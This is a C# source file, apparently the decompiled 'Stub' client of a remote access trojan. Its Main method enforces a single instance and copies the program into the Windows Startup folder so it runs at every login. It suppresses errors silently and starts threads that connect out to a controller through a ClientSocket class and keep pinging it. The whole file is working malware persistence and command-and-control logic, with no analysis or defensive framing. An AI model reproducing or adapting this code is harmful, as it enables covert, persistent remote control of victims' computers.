using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			ProjectData.EndApp();
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(Settings.path2);
			if (!File.Exists(text))
			{
				File.Copy(Settings.path2, text);
				FileInfo fileInfo = new FileInfo(text);
				fileInfo.Attributes = FileAttributes.Normal;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Settings.dTimer2.Elapsed += Helper.tickees;
		Thread thread = new Thread(ClientSocket.BeginConnect);
		thread.Start();
		Thread thread2 = new Thread(ClientSocket.Ping);
		thread2.Start();
	}
}
